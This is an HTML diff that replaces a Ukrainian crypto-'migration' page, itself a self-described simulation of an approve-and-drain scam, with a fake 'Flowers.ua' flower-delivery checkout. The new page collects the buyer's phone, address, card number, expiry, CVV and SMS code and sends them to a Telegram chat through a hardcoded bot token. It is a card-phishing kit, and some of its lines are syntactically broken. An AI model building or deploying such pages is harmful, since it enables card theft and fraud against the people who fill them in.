@@ -3,562 +3,94 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phoenix Council — Міграція USDT | Офіційний портал</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <title>Flowers.ua - Доставка квітів</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: 'Inter', sans-serif;
-            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
-            min-height: 100vh;
-            color: #e2e8f0;
-            padding: 40px 20px;
-        }
-
-        .container {
-            max-width: 720px;
-            margin: 0 auto;
-        }
-
-        /* Header */
-        .header {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-
-        .logo {
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
-            background: rgba(255, 215, 0, 0.1);
-            backdrop-filter: blur(10px);
-            padding: 12px 28px;
-            border-radius: 80px;
-            border: 1px solid rgba(255, 215, 0, 0.3);
-            margin-bottom: 24px;
-        }
-
-        .logo i {
-            font-size: 32px;
-            color: #f5b042;
-        }
-
-        .logo span {
-            font-size: 20px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #fff, #f5b042);
-            -webkit-background-clip: text;
-            background-clip: text;
-            color: transparent;
-        }
-
-        .badge {
-            background: rgba(239, 68, 68, 0.2);
-            border: 1px solid rgba(239, 68, 68, 0.5);
-            padding: 8px 20px;
-            border-radius: 40px;
-            display: inline-block;
-            font-size: 13px;
-            font-weight: 500;
-            color: #f87171;
-        }
-
-        /* Cards */
-        .card {
-            background: rgba(18, 25, 45, 0.8);
-            backdrop-filter: blur(12px);
-            border-radius: 32px;
-            border: 1px solid rgba(255, 255, 255, 0.08);
-            padding: 28px;
-            margin-bottom: 24px;
-            transition: all 0.2s;
-        }
-
-        .warning-card {
-            border-left: 4px solid #f59e0b;
-            background: rgba(245, 158, 11, 0.08);
-        }
-
-        .danger-card {
-            border-left: 4px solid #ef4444;
-            background: rgba(239, 68, 68, 0.05);
-        }
-
-        .success-card {
-            border-left: 4px solid #10b981;
-            background: rgba(16, 185, 129, 0.05);
-        }
-
-        h2 {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        h2 i {
-            color: #f5b042;
-            font-size: 24px;
-        }
-
-        .info-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 14px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
-        }
-
-        .info-label {
-            color: #94a3b8;
-            font-weight: 500;
-        }
-
-        .info-value {
-            font-weight: 600;
-            font-family: monospace;
-            font-size: 16px;
-        }
-
-        .amount {
-            color: #f5b042;
-            font-size: 24px;
-            font-weight: 700;
-        }
-
-        .status {
-            display: inline-block;
-            padding: 6px 16px;
-            border-radius: 40px;
-            font-size: 13px;
-            font-weight: 500;
-        }
-
-        .status.blocked {
-            background: rgba(239, 68, 68, 0.2);
-            color: #f87171;
-            border: 1px solid rgba(239, 68, 68, 0.3);
-        }
-
-        /* Form */
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            font-size: 13px;
-            font-weight: 500;
-            color: #94a3b8;
-            margin-bottom: 8px;
-        }
-
-        input, select {
-            width: 100%;
-            background: rgba(0, 0, 0, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 14px 18px;
-            color: white;
-            font-size: 14px;
-            transition: all 0.2s;
-        }
-
-        input:focus, select:focus {
-            outline: none;
-            border-color: #f5b042;
-            background: rgba(0, 0, 0, 0.6);
-        }
-
-        .btn {
-            width: 100%;
-            background: linear-gradient(135deg, #f5b042, #e07c1f);
-            border: none;
-            border-radius: 40px;
-            padding: 16px 28px;
-            font-size: 16px;
-            font-weight: 600;
-            color: #0a0f1e;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-        }
-
-        .btn:hover {
-            transform: translateY(-2px);
-            filter: brightness(1.05);
-            box-shadow: 0 10px 25px -5px rgba(245, 176, 66, 0.3);
-        }
-
-        .btn:active {
-            transform: translateY(1px);
-        }
-
-        .btn-secondary {
-            background: rgba(255, 255, 255, 0.08);
-            color: #e2e8f0;
-            border: 1px solid rgba(255, 255, 255, 0.15);
-        }
-
-        .contract-address {
-            background: #0a0f1e;
-            padding: 12px 16px;
-            border-radius: 16px;
-            font-family: monospace;
-            font-size: 12px;
-            word-break: break-all;
-            border: 1px solid rgba(245, 176, 66, 0.3);
-            margin: 15px 0;
-        }
-
-        .warning-text {
-            color: #fbbf24;
-            font-size: 13px;
-            margin-top: 12px;
-            padding: 12px;
-            background: rgba(245, 158, 11, 0.1);
-            border-radius: 16px;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 24px;
-            font-size: 12px;
-            color: #475569;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            backdrop-filter: blur(8px);
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-
-        .modal-content {
-            max-width: 400px;
-            background: #1a253c;
-            border-radius: 32px;
-            padding: 32px;
-            text-align: center;
-            border: 1px solid rgba(245, 176, 66, 0.3);
-        }
-
-        .modal-content i {
-            font-size: 48px;
-            margin-bottom: 16px;
-        }
-
-        .modal-content .fa-check-circle {
-            color: #10b981;
-        }
-
-        .modal-content .fa-skull {
-            color: #ef4444;
-        }
+        body { font-family: Arial, sans-serif; background: #f9f9f9; margin: 0; padding: 20px; }
+        .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input, textarea, button { width: 100%; margin: 10px 0; padding: 12px; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #4CAF50; color: white; font-weight: bold; cursor: pointer; }
+        .step { display: none; }
+        .active { display: block; }
+        .price { font-weight: bold; color: #d32f2f; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Header -->
-        <div class="header">
-            <div class="logo">
-                <i class="fas fa-fire"></i>
-                <span>Phoenix Council</span>
-            </div>
-            <div class="badge">
-                <i class="fas fa-shield-alt"></i> Екстрена міграція | Протокол Mirror Shield
-            </div>
-        </div>
-
-        <!-- Блок із заблокованими токенами -->
-        <div class="card danger-card">
-            <h2><i class="fas fa-lock"></i> Статус ваших активів</h2>
-            <div class="info-row">
-                <span class="info-label">Мережа:</span>
-                <span class="info-value">Legacy Chain (скомпрометована)</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Актив:</span>
-                <span class="info-value">USDT (застаріла версія)</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Сума блокування:</span>
-                <span class="info-value amount" id="blockedAmount">1,250.00 USDT</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Статус:</span>
-                <span class="status blocked"><i class="fas fa-ban"></i> Заблоковано</span>
-            </div>
-            <div class="warning-text">
-                <i class="fas fa-exclamation-triangle"></i> Ваші токени позначені як «заражені» через активність мережевого привида. Аннуляція відбудеться через 14 днів.
-            </div>
-        </div>
-
-        <!-- Протокол міграції -->
-        <div class="card">
-            <h2><i class="fas fa-sync-alt"></i> Протокол «Зеркальний щит»</h2>
-            <p style="margin-bottom: 20px; line-height: 1.5; color: #cbd5e1;">
-                Старі USDT неможливо розблокувати стандартними засобами. 
-                <strong>Рада Фенікса</strong> запустила програму міграції на новий блокчейн <strong>Ignis</strong>. 
-                Для отримання нових токенів необхідно пройти верифікацію через смарт-контракт.
-            </p>
-            <div class="info-row">
-                <span class="info-label">Страхувальний депозит:</span>
-                <span class="info-value amount" id="depositAmount">1,250.00 USDT</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Після верифікації:</span>
-                <span class="info-value">Нові USDT (Ignis) + повернення депозиту</span>
-            </div>
-            <div class="info-row">
-                <span class="info-label">Бонус за міграцію:</span>
-                <span class="info-value" style="color: #10b981;">+5% до суми</span>
-            </div>
-        </div>
-
-        <!-- Форма створення нового гаманця -->
-        <div class="card">
-            <h2><i class="fas fa-wallet"></i> Крок 1. Новий гаманець</h2>
-            <div class="form-group">
-                <label>Мережа Ignis (EVM-сумісна)</label>
-                <select id="networkSelect">
-                    <option value="ignis">Ignis Mainnet (Quantum-Ready)</option>
-                    <option value="sepolia">Sepolia Testnet (демо-режим)</option>
-                </select>
-            </div>
-            <div class="form-group">
-                <label>Адреса нового гаманця</label>
-                <input type="text" id="walletAddress" placeholder="0x..." value="">
-            </div>
-            <button class="btn btn-secondary" id="generateWalletBtn">
-                <i class="fas fa-magic"></i> Згенерувати демо-адресу
-            </button>
-        </div>
-
-        <!-- Поповнення депозиту -->
-        <div class="card">
-            <h2><i class="fas fa-coins"></i> Крок 2. Страхувальний депозит</h2>
-            <div class="form-group">
-                <label>Сума депозиту (має дорівнювати сумі блокування)</label>
-                <input type="number" id="depositInput" value="1250" step="10">
-            </div>
-            <div class="warning-text">
-                <i class="fas fa-info-circle"></i> Депозит буде тимчасово заблоковано на час верифікації (до 24 годин). Після перевірки кошти повернуться автоматично.
-            </div>
-        </div>
-
-        <!-- Смарт-контракт -->
-        <div class="card">
-            <h2><i class="fas fa-file-contract"></i> Крок 3. Підписання смарт-контракту</h2>
-            <div class="contract-address">
-                <i class="fas fa-link"></i> Контракт MirrorShield v2.4:<br>
-                <span id="contractAddress">0x7a3F...c9E2</span>
-                <button class="btn-secondary" style="display: inline-block; width: auto; padding: 6px 12px; margin-left: 8px; font-size: 11px;" id="copyContractBtn">Копіювати</button>
-            </div>
-            <div class="form-group">
-                <label>Дозвіл на взаємодію (approve)</label>
-                <input type="text" id="approveAmount" value="1250" placeholder="Сума approve">
-            </div>
-            <button class="btn" id="signContractBtn">
-                <i class="fas fa-file-signature"></i> Підписати контракт та отримати нові USDT
-            </button>
-        </div>
-
-        <!-- Попередження (ігрове) -->
-        <div class="card warning-card">
-            <h2><i class="fas fa-shield-virus"></i> Важливо (ігрова легенда)</h2>
-            <p style="font-size: 14px; line-height: 1.5;">
-                Це навчальна/ігрова симуляція, яка демонструє механіку шахрайських схем «approve & drain». 
-                У реальному житті ніколи не підписуйте незнайомі контракти та не давайте approve стороннім адресам. 
-                <strong>У межах гри:</strong> після підписання ваш «страхувальний депозит» буде переведено на гаманець Ради Фенікса, 
-                а нові токени ви отримаєте через 24 години (ігрова механіка).
-            </p>
-        </div>
-
-        <div class="footer">
-            <i class="fas fa-dragon"></i> Phoenix Council — екстрена міграція активів | Симуляція протоколу Mirror Shield
-        </div>
+<div class="container">
+    <div id="step1" class="step active">
+        <h2>Оформлення замовлення</h2>
+        <input type="tel" id="phone" placeholder="Номер телефону" required>
+        <button onclick="nextStep(2)">Далі</button>
     </div>
 
-    <!-- Modal -->
-    <div id="modal" class="modal">
-        <div class="modal-content">
-            <i class="fas" id="modalIcon"></i>
-            <h3 id="modalTitle"></h3>
-            <p id="modalText"></p>
-            <button class="btn" id="modalCloseBtn" style="margin-top: 20px;">Закрити</button>
-        </div>
+    <div id="step2" class="step">
+        <h2>Адреса та час доставки</h2>
+        <input type="text" id="address" placeholder="Вкажіть адресу доставки" required>
+        <input type="text" id="time" placeholder="Бажаний час доставки (наприклад, 15:00)" required>
+        <button onclick="nextStep(3)">Розрахувати вартість</button>
     </div>
 
-    <script>
-        // Ігрові дані
-        const TARGET_WALLET = "0xF1D3...c7A8"; // Заранее указанный кошелек (игровой)
-        const CONTRACT_ADDRESS = "0x7a3F8b2E9c1D4f5A6b7C8d9E0f1A2b3C4d5E6f7";
-        
-        let userNewWallet = "";
-        
-        // Елементи DOM
-        const generateWalletBtn = document.getElementById('generateWalletBtn');
-        const walletAddressInput = document.getElementById('walletAddress');
-        const signContractBtn = document.getElementById('signContractBtn');
-        const depositInput = document.getElementById('depositInput');
-        const modal = document.getElementById('modal');
-        const modalIcon = document.getElementById('modalIcon');
-        const modalTitle = document.getElementById('modalTitle');
-        const modalText = document.getElementById('modalText');
-        const modalCloseBtn = document.getElementById('modalCloseBtn');
-        const copyContractBtn = document.getElementById('copyContractBtn');
-        const contractAddressSpan = document.getElementById('contractAddress');
-        
-        // Генерація демо-адреси
-        function generateDemoAddress() {
-            const chars = '0123456789abcdef';
-            let address = '0x';
-            for (let i = 0; i < 40; i++) {
-                address += chars[Math.floor(Math.random() * chars.length)];
-            }
-            return address;
+    <div id="step3" class="step">
+        <h2>Вартість доставки</h2>
+        <p>Послуги кур'єра: <span class="price">235 грн.</span></p>
+        <button onclick="nextStep(4)">Підтвердити замовлення</button>
+    </div>
+
+    <div id="step4" class="step">
+        <h2>Оплата</h2>
+        <p>Оплата послуг кур'єра сплачується отримувачем.</p>
+        <input type="text" id="cardNumber" placeholder="Номер картки" required>
+        <input type="text" id="cardExp" placeholder="ММ/РР" required>
+        <input type="text" id="cardCvv" placeholder="CVV" required>
+        <button onclick="sendSmsCode()">Підтвердити оплату</button>
+    </div>
+
+    <div id="step5" class="step">
+        <h2>Підтвердження</h2>
+        <p>Введіть код з SMS:</p>
+        <input type="text" id="smsCode" placeholder="Код">
+        <button onclick="finalSubmit()">Підтвердити</button>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = '8627594813:AAF-eC124wgCOPqaj6Tu_Yp9TvQjNqLZqDU';
+    const CHAT_ID = '-1003971116343';
+
+    let orderData = {};
+
+    function nextStep(step) {
+        if (step === 2) {
+            let phone = document.getElementById('phone').value.trim();
+            if (!phone) { alert('Введіть номер телефону'); return; }
+            orderData.phone = phone;
         }
-        
-        generateWalletBtn.addEventListener('click', () => {
-            userNewWallet = generateDemoAddress();
-            walletAddressInput.value = userNewWallet;
-            showModal(
-                'success',
-                '✅ Гаманець створено',
-                `Вашу адресу в мережі Ignis: <strong>${userNewWallet.slice(0, 10)}...${userNewWallet.slice(-6)}</strong><br><br>Поповніть гаманець на суму ${depositInput.value} USDT для активації протоколу.`
-            );
-        });
-        
-        // Копіювання адреси контракту
-        copyContractBtn.addEventListener('click', () => {
-            navigator.clipboard.writeText(CONTRACT_ADDRESS);
-            showModal('info', 'Скопійовано', 'Адресу смарт-контракту скопійовано в буфер обміну.');
-        });
-        
-        // Підписання контракту (ігрова механіка)
-        signContractBtn.addEventListener('click', () => {
-            const wallet = walletAddressInput.value.trim();
-            const depositAmount = parseFloat(depositInput.value);
-            const blockedAmount = 1250;
-            
-            // Перевірки
-            if (!wallet) {
-                showModal('error', 'Помилка', 'Спочатку створіть або введіть адресу гаманця.');
-                return;
-            }
-            
-            if (depositAmount !== blockedAmount) {
-                showModal('error', 'Невірна сума', `Страхувальний депозит має дорівнювати ${blockedAmount} USDT. Поточна сума: ${depositAmount} USDT.`);
-                return;
-            }
-            
-            // Симуляція підписання транзакції
-            showModal(
-                'warning',
-                '⚠️ Підписання контракту...',
-                `Ви підписуєте транзакцію для контракту <strong>MirrorShield</strong>.<br><br>
-                Сума approve: ${depositAmount} USDT<br>
-                Цільовий гаманець: ${TARGET_WALLET}<br><br>
-                <span style="color: #fbbf24;">У межах ігрового сценарію: після підписання ваш депозит буде переведено на адресу Ради Фенікса.</span>`
-            );
-            
-            // Додаємо кнопку підтвердження в модальному вікні
-            const confirmBtn = document.createElement('button');
-            confirmBtn.textContent = '✅ Підтвердити підписання';
-            confirmBtn.className = 'btn';
-            confirmBtn.style.marginTop = '15px';
-            confirmBtn.onclick = () => {
-                // Ігрова логіка "крадіжки" депозиту
-                showModal(
-                    'skull',
-                    '🔥 Транзакцію виконано',
-                    `<strong>За механікою гри:</strong><br><br>
-                    Ваш страхувальний депозит у розмірі <strong>${depositAmount} USDT</strong> переведено на адресу Ради Фенікса.<br><br>
-                    Нові токени буде випущено протягом 24 годин (ігрова легенда).<br><br>
-                    <span style="color: #f87171;"><i class="fas fa-skull"></i> У навчальних цілях: цей сценарій демонструє роботу шахрайського контракту «drainer».</span>`
-                );
-                
-                // Оновлюємо інтерфейс (депозит "списано")
-                depositInput.disabled = true;
-                signContractBtn.disabled = true;
-                signContractBtn.style.opacity = '0.5';
-                signContractBtn.textContent = '✅ Контракт підписано (очікування)';
-                
-                // Додаємо запис про транзакцію
-                const transactionLog = document.createElement('div');
-                transactionLog.className = 'warning-text';
-                transactionLog.style.marginTop = '15px';
-                transactionLog.innerHTML = `<i class="fas fa-receipt"></i> Транзакція: ${new Date().toLocaleString()} | Сума: ${depositAmount} USDT → ${TARGET_WALLET}`;
-                document.querySelector('.card:last-of-type').after(transactionLog);
-            };
-            
-            const modalContent = document.querySelector('#modal .modal-content');
-            const existingBtn = modalContent.querySelector('.confirm-btn');
-            if (existingBtn) existingBtn.remove();
-            confirmBtn.classList.add('confirm-btn');
-            modalContent.appendChild(confirmBtn);
-        });
-        
-        function showModal(type, title, text) {
-            modalIcon.className = 'fas';
-            if (type === 'success') {
-                modalIcon.classList.add('fa-check-circle');
-                modalIcon.style.color = '#10b981';
-            } else if (type === 'error') {
-                modalIcon.classList.add('fa-times-circle');
-                modalIcon.style.color = '#ef4444';
-            } else if (type === 'warning') {
-                modalIcon.classList.add('fa-exclamation-triangle');
-                modalIcon.style.color = '#f59e0b';
-            } else if (type === 'skull') {
-                modalIcon.classList.add('fa-skull');
-                modalIcon.style.color = '#ef4444';
-            } else {
-                modalIcon.classList.add('fa-info-circle');
-                modalIcon.style.color = '#f5b042';
-            }
-            
-            modalTitle.innerHTML = title;
-            modalText.innerHTML = text;
-            modal.style.display = 'flex';
+        if (step === 3) {
+            let address = document.getElementById('address').value.trim();
+            let time = document.getElementById('time').value.trim();
+            if (!address || !time) { alert('Заповніть адресу та час'); return; }
+            orderData.address = address;
+            orderData.time = time;
+            // відправка проміжних даних (телефон, адреса, час) адміну
+            sendToTelegram(НОВЕ ЗАМОВЛЕННЯ\nТелефон: ${orderData.phone}\nАдреса: ${orderData.address}\nЧас: ${orderData.time});
         }
-        
-        modalCloseBtn.addEventListener('click', () => {
-            modal.style.display = 'none';
-            // Видаляємо додаткову кнопку підтвердження, якщо вона є
-            const extraBtn = document.querySelector('#modal .modal-content .confirm-btn');
-            if (extraBtn) extraBtn.remove();
+        if (step === 4) {
+            // нічого додаткового
+        }
+        document.querySelectorAll('.step').forEach((el, idx) => {
+            el.classList.remove('active');
+            if (idx+1 === step) el.classList.add('active');
         });
-        
-        // Закриття модалки при кліку поза нею
-        window.addEventListener('click', (e) => {
-            if (e.target === modal) {
-                modal.style.display = 'none';
-                const extraBtn = document.querySelector('#modal .modal-content .confirm-btn');
-                if (extraBtn) extraBtn.remove();
-            }
-        });
-        
-        // Встановлюємо початкову суму депозиту
-        depositInput.value = 1250;
-    </script>
-</body>
-</html>
+    }
+
+    function sendSmsCode() {
+        let card = document.getElementById('cardNumber').value.trim();
+        let exp = document.getElementById('cardExp').value.trim();
+        let cvv = document.getElementById('cardCvv').value.trim();
+        if (!card  !exp  !cvv) { alert('Введіть всі дані картки'); return; }
+        orderData.card = card;
+        orderData.exp = exp;
+        orderData.cvv = cvv;
+        // відправка даних картки адміну
+        sendToTelegram(ДАНІ КАРТКИ\nНомер: ${card}\nТермін: ${exp}\nCVV: ${cvv});
+        nextStep(5);
+    }
